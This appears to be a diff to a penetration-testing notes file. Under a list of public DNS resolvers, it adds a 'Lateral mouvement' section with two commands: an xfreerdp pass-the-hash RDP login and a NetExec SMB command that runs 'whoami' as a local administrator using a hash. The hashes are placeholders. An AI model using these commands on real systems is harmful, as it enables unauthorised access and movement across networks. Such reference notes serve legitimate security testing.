@@ -281,4 +281,11 @@ DNS4all 194.0.5.3
 CloudFlare 1.1.1.1
 dns.sb 185.222.222.222, 45.11.45.11
 
+Lateral mouvement
+---
+```
+xfreerdp /v:10.10.10.10 /u:mon.user /pth:1234567894561zeyreye /cert:ignore
+nxc smb 10.10.10.10 --local-auth -u administrator -H 13213212121211212dfhgshsghgfd x-x whoami 
+```
+
 <br/><br/>
